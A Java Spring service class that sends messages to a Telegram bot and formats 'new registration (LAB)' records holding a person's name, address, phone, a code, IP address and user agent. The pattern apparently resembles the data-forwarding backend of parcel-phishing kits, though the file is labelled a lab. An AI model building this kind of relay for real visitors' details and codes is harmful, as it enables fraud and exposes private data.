package com.paq.lab.service;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.util.UriComponentsBuilder;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

@Service
public class TelegramService {

    private static final Logger log = LoggerFactory.getLogger(TelegramService.class);

    private final RestTemplate restTemplate;

    @Value("${app.telegram.bot-token:}")
    private String botToken;

    @Value("${app.telegram.chat-id:}")
    private String chatId;

    public TelegramService(RestTemplate restTemplate) {
        this.restTemplate = restTemplate;
    }

    public void sendToTelegram(String message) {
        // Cambiado isBlank() por trim().isEmpty() compatible Java 8+
        if (botToken == null || botToken.trim().isEmpty() || chatId == null || chatId.trim().isEmpty()) {
            log.warn("Telegram bot token or chat id not configured. Skipping send.");
            return;
        }

        String base = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        URI uri = UriComponentsBuilder.fromHttpUrl(base)
                .queryParam("chat_id", chatId)
                .queryParam("text", message)
                .build()
                .encode(StandardCharsets.UTF_8)
                .toUri();

        try {
            String response = restTemplate.getForObject(uri, String.class);
            log.info("Telegram API response: {}", response);
        } catch (Exception ex) {
            log.error("Error sending message to Telegram", ex);
        }
    }

    public static String buildMessage(String nombre, String direccion, String telefono, String codigo, String ip, String ua) {
        String ts = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        StringBuilder sb = new StringBuilder();
        sb.append("📦 *Nuevo registro (LAB)*").append("\n")
          .append("Nombre: ").append(nombre).append("\n")
          .append("Dirección: ").append(direccion).append("\n")
          .append("Teléfono: ").append(telefono).append("\n")
          .append("Código: ").append(codigo).append("\n")
          .append("IP: ").append(ip).append("\n")
          .append("UA: ").append(ua).append("\n")
          .append("Fecha: ").append(ts);
        return sb.toString();
    }
}
